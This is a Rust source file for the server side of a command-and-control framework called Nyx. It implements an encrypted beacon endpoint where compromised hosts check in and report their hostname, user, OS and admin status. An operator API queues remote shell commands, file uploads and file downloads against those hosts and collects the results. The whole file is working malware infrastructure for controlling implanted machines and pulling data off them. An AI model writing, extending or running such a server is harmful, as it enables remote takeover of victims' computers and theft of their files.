//! Nyx team server (HTTP, P0).
//!
//! Routes:
//! - `POST /beacon`            — implant traffic (encrypted frame); returns queued tasks.
//! - `GET  /api/sessions`      — list registered sessions (JSON).
//! - `POST /api/task`          — queue a task for a session (JSON).
//! - `GET  /api/results`       — drain task results for a session (JSON).

use std::sync::Arc;
use std::time::Instant;

use axum::{
    body::Bytes,
    extract::{Query, State},
    http::StatusCode,
    response::{IntoResponse, Response},
    routing::{get, post},
    Json, Router,
};
use dashmap::DashMap;
use nyx_protocol::{
    encode_frame, open_frame, parse_frame, wire::Reader, Command, Response as MsgResponse,
    ServerKeypair, SessionInfo, SessionKey, Task, TaskResponse,
};
use serde::{Deserialize, Serialize};

/// A session is keyed by the implant's 32-byte ephemeral public key.
pub type SessionId = [u8; 32];

pub struct Session {
    pub key: SessionKey,
    pub info: SessionInfo,
    pub last_recv: u64,
    pub send_counter: u64,
    pub next_task_id: u64,
    pub pending: Vec<Task>,
    pub results: Vec<TaskResponse>,
    pub created: Instant,
}

pub struct AppState {
    pub keypair: ServerKeypair,
    pub sessions: DashMap<SessionId, Session>,
}

impl Default for AppState {
    fn default() -> Self {
        Self {
            keypair: ServerKeypair::generate(),
            sessions: DashMap::new(),
        }
    }
}

pub fn router(state: Arc<AppState>) -> Router {
    Router::new()
        .route("/beacon", post(beacon))
        .route("/api/sessions", get(list_sessions))
        .route("/api/task", post(post_task))
        .route("/api/results", get(get_results))
        .with_state(state)
}

// ---- implant endpoint ------------------------------------------------------

async fn beacon(State(st): State<Arc<AppState>>, body: Bytes) -> Response {
    match handle_beacon(&st, &body) {
        Ok(resp) => (StatusCode::OK, resp).into_response(),
        Err(e) => {
            tracing::warn!(error = %e, "beacon handler error");
            StatusCode::BAD_REQUEST.into_response()
        }
    }
}

fn handle_beacon(st: &AppState, body: &[u8]) -> anyhow::Result<Vec<u8>> {
    let raw = parse_frame(body)?;
    let is_new = !st.sessions.contains_key(&raw.pubkey);

    let key = if is_new {
        st.keypair.derive_for(&raw.pubkey)
    } else {
        let s = st.sessions.get(&raw.pubkey).expect("checked above");
        // Anti-replay: reject non-monotonic counters.
        if raw.counter <= s.last_recv {
            anyhow::bail!("replayed/stale counter {}", raw.counter);
        }
        s.key
    };

    let plaintext = open_frame(&key, &raw).map_err(|_| anyhow::anyhow!("frame decryption failed"))?;

    if is_new {
        // First message from an implant is always its SessionInfo (check-in).
        let mut r = Reader::new(&plaintext);
        let info = SessionInfo::decode(&mut r)?;
        tracing::info!(
            beacon_id = info.beacon_id,
            host = %info.hostname,
            user = %info.username,
            os = %info.os,
            "new session registered"
        );
        let session = Session {
            key,
            info,
            last_recv: raw.counter,
            send_counter: 0,
            next_task_id: 1,
            pending: Vec::new(),
            results: Vec::new(),
            created: Instant::now(),
        };
        st.sessions.insert(raw.pubkey, session);
        // No tasks queued yet — reply with an empty batch.
        Ok(encode_frame(&raw.pubkey, 0, &key, &Task::encode_vec(&[])))
    } else {
        // Subsequent messages carry task responses; we reply with queued tasks.
        let responses = TaskResponse::decode_vec(&plaintext)?;
        {
            let mut s = st.sessions.get_mut(&raw.pubkey).expect("checked above");
            s.last_recv = raw.counter;
            for r in responses {
                s.results.push(r);
            }
        }
        let (reply, counter) = {
            let mut s = st.sessions.get_mut(&raw.pubkey).expect("checked above");
            let tasks = std::mem::take(&mut s.pending);
            s.send_counter += 1;
            (Task::encode_vec(&tasks), s.send_counter)
        };
        Ok(encode_frame(&raw.pubkey, counter, &key, &reply))
    }
}

// ---- control API -----------------------------------------------------------

#[derive(Serialize)]
struct SessionView {
    id: String,
    beacon_id: u32,
    hostname: String,
    username: String,
    os: String,
    arch: u8,
    pid: u32,
    is_admin: u8,
    pending: usize,
    age_secs: u64,
}

async fn list_sessions(State(st): State<Arc<AppState>>) -> Json<Vec<SessionView>> {
    let mut out = Vec::new();
    for entry in st.sessions.iter() {
        out.push(SessionView {
            id: hex::encode(entry.key()),
            beacon_id: entry.info.beacon_id,
            hostname: entry.info.hostname.clone(),
            username: entry.info.username.clone(),
            os: entry.info.os.clone(),
            arch: entry.info.arch,
            pid: entry.info.pid,
            is_admin: entry.info.is_admin,
            pending: entry.pending.len(),
            age_secs: entry.created.elapsed().as_secs(),
        });
    }
    Json(out)
}

#[derive(Deserialize)]
struct TaskReq {
    session: String,
    command: JsonCommand,
}

#[derive(Deserialize)]
#[serde(tag = "type", rename_all = "lowercase")]
enum JsonCommand {
    Ping,
    Shell { args: String },
    Sleep { seconds: u32, jitter_pct: u8 },
    /// Write `data_hex` (hex-encoded bytes) to a file named `name` on the target.
    Upload { name: String, data_hex: String },
    /// Read `path` off the target (streamed back as `FileChunk`s).
    Download { path: String },
    Exit,
}

impl JsonCommand {
    /// Convert to a wire [`Command`]. `Upload` decodes its hex payload here; a
    /// malformed hex string is surfaced as an error for a 400 response.
    fn into_command(self) -> Result<Command, &'static str> {
        Ok(match self {
            JsonCommand::Ping => Command::Ping,
            JsonCommand::Shell { args } => Command::Shell { args },
            JsonCommand::Sleep { seconds, jitter_pct } => Command::Sleep { seconds, jitter_pct },
            JsonCommand::Upload { name, data_hex } => {
                let data = hex::decode(&data_hex).map_err(|_| "bad data_hex")?;
                Command::Upload { name, data }
            }
            JsonCommand::Download { path } => Command::Download { path },
            JsonCommand::Exit => Command::Exit,
        })
    }
}

#[derive(Serialize)]
struct TaskAck {
    task_id: u64,
}

fn parse_session_hex(s: &str) -> Option<SessionId> {
    let v = hex::decode(s).ok()?;
    <[u8; 32]>::try_from(v.as_slice()).ok()
}

async fn post_task(State(st): State<Arc<AppState>>, Json(req): Json<TaskReq>) -> Response {
    let id = match parse_session_hex(&req.session) {
        Some(id) => id,
        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
    };
    let command = match req.command.into_command() {
        Ok(c) => c,
        Err(msg) => return (StatusCode::BAD_REQUEST, msg).into_response(),
    };
    let mut s = match st.sessions.get_mut(&id) {
        Some(s) => s,
        None => return (StatusCode::NOT_FOUND, "no such session").into_response(),
    };
    let task_id = s.next_task_id;
    s.next_task_id += 1;
    s.pending.push(Task { task_id, command });
    (StatusCode::OK, Json(TaskAck { task_id })).into_response()
}

#[derive(Deserialize)]
struct ResultsQuery {
    session: String,
}

#[derive(Serialize)]
struct ResultView {
    task_id: u64,
    kind: String,
    text: String,
    /// Present only for `FileChunk` results (hex-encoded chunk bytes).
    #[serde(skip_serializing_if = "Option::is_none")]
    data_hex: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    seq: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    eof: Option<u8>,
}

async fn get_results(State(st): State<Arc<AppState>>, Query(q): Query<ResultsQuery>) -> Response {
    let id = match parse_session_hex(&q.session) {
        Some(id) => id,
        None => return (StatusCode::BAD_REQUEST, "bad session hex").into_response(),
    };
    let drained = match st.sessions.get_mut(&id) {
        Some(mut s) => std::mem::take(&mut s.results),
        None => return (StatusCode::NOT_FOUND, "no such session").into_response(),
    };
    let views: Vec<ResultView> = drained
        .into_iter()
        .map(|r| {
            let (kind, text, data_hex, seq, eof) = match r.response {
                MsgResponse::Output(b) => {
                    ("output", String::from_utf8_lossy(&b).into_owned(), None, None, None)
                }
                MsgResponse::Ok => ("ok", String::new(), None, None, None),
                MsgResponse::Err(m) => ("error", m, None, None, None),
                MsgResponse::FileChunk { name, seq, eof, data } => (
                    "file",
                    format!("<chunk {name}#{seq}>"),
                    Some(hex::encode(&data)),
                    Some(seq),
                    Some(eof),
                ),
            };
            ResultView {
                task_id: r.task_id,
                kind: kind.to_string(),
                text,
                data_hex,
                seq,
                eof,
            }
        })
        .collect();
    (StatusCode::OK, Json(views)).into_response()
}
